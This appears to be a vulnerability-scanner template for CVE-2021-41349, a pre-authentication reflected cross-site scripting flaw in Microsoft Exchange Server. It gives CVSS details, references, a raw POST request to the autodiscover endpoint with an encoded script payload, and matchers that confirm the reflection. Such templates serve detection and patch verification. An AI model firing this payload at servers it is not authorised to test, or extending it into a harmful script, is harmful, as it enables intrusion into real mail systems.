id: CVE-2021-41349
info:
  author: rootxharsh,iamnoooob
  classification:
    cve-id: CVE-2021-41349
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 6.5
  description: Microsoft Exchange Server is vulnerable to a spoofing vulnerability.
    Be aware this CVE ID is unique from CVE-2021-42305.
  name: Microsoft Exchange Server Pre-Auth POST Based Reflected Cross-Site Scripting
  reference:
  - https://www.microsoft.com/en-us/download/details.aspx?id=103643
  - https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2021-41349
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41349
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-41349
  severity: medium
  tags: cve,cve2021,xss,microsoft,exchange
requests:
- matchers:
  - condition: and
    type: word
    words:
    - alert(document.domain);
    - a=""
  - part: header
    type: word
    words:
    - text/html
  - negative: true
    type: word
    words:
    - A potentially dangerous Request.Form value was detected from the client
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - 'POST /autodiscover/autodiscover.json HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    %3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1

    '
